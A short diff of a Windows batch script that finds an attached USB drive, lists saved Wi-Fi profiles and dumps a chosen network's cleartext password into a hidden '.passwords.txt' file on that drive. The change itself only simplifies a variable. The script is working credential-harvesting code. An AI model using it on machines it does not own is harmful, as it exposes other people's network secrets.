@@ -10,11 +10,10 @@ pause >nul
 for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "Removable"') do (
 set drive=%%A
 )
-SET dest= %drive%
 :LOOP   
 netsh wlan show profiles
 SET /P ssid= Enter WIFI SSID : 
-netsh wlan show profiles "%ssid%" key=clear >> %dest%:/.passwords.txt
+netsh wlan show profiles "%ssid%" key=clear >> %drive%:/.passwords.txt
 echo "Done Successfully!"
 pause
 cls
